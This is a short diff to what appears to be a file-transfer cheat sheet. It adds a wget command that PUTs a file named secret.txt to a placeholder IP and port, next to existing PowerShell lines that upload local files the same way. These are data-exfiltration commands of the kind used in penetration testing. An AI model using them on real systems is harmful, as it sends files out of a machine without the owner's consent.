@@ -28,6 +28,10 @@ powershell
 ----------
 powershell $body = Get-Content c:\temp\file.txt; Invoke-RestMethod -Uri http://<ip-address>:<port>/file.txt -Method PUT -Body $body
 powershell $body = Get-Content 'C:\Program Files\7-Zip\7z.exe'; Invoke-RestMethod -Uri http://<ip-address>:<port>/7z.exe -Method PUT -Body $body
+
+wget
+----
+wget --method=PUT --post-file=secret.txt http://<ip-address>:<port>/
 ```
 
 
